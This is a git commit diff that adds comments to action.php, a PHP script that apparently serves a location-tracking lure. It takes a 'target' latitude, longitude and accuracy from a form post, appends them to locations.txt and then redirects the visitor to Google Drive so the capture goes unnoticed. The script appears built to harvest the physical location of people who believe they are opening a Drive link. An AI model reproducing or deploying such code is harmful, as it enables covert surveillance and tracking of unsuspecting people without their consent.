bb093672ce1b9ca892ec3e3a7c3fb18366204328
Sun <73415680+SunPodder@users.noreply.github.com>
2021-07-13 20:23:49 +0600

    Update action.php

--- action.php
+++ action.php
@@ -1,8 +1,12 @@
 <?php 
+  //target latitude
   $lat = $_POST['lat'];
+  //target Longitude
   $long = $_POST['long'];
+  //location accuracy
   $acc = $_POST['acc'];
   
+  //write downs all information in location.txt file
   $file = fopen('locations.txt', 'a');
   fwrite($file, "Latitude: ".$lat);
   fwrite($file, "\nLongitude: ".$long);
@@ -10,9 +14,9 @@
   fclose($file);
 ?>
 
-
 <html>
   <head>
+    <!--redirects to Google Drive-->
     <meta http-equiv="refresh" content="1;url=https://drive.google.com">
   </head>
 </head>
